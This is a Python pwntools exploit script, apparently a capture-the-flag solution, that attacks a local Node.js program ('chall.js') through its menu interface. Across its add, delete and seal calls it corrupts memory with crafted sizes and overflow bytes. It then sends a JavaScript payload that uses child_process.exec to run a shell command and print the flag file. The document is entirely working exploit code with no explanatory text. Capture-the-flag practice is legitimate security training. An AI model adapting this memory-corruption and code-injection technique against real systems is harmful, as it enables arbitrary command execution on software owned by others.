#!/usr/bin/env python
from pwn import *

def add(size, content, to, select):
    s.sendlineafter('Select:\n', '1')
    s.sendlineafter('Size:\n', str(size))
    s.sendafter('Content:\n', content)
    s.sendafter('To:\n', to)
    s.sendlineafter('Select:\n', str(select))

def delete(index):
    s.sendlineafter('Select:\n', '3')
    s.sendlineafter('Index:\n', str(index))

def seal():
    s.sendlineafter('Select:\n', '5')

if __name__ == '__main__':
    s = process(['node', 'chall.js'])

    add(0xc, 'A' * 0xb, 'B' * 0x1f + '\n', 1)
    add(0xc, 'A' * 0xb, 'B' * 0x1f + '\n', 1)
    delete(0)
    add(0xc, 'A' * 0xb, 'B' * 0x20 + '\x53', 1)

    script = 'require("child_process").exec("cat flag", (a, b, c) => console.log(b))'

    payload = ''
    payload += 'A' * 0x10
    payload += p32(len(script) + 1)
    payload += p32(0xff8)
    payload += p32(5)
    add(len(payload) + 1, payload, 'B' * 0x1f + '\n', 1)

    seal()

    s.send(script + '\0')

    s.stream()
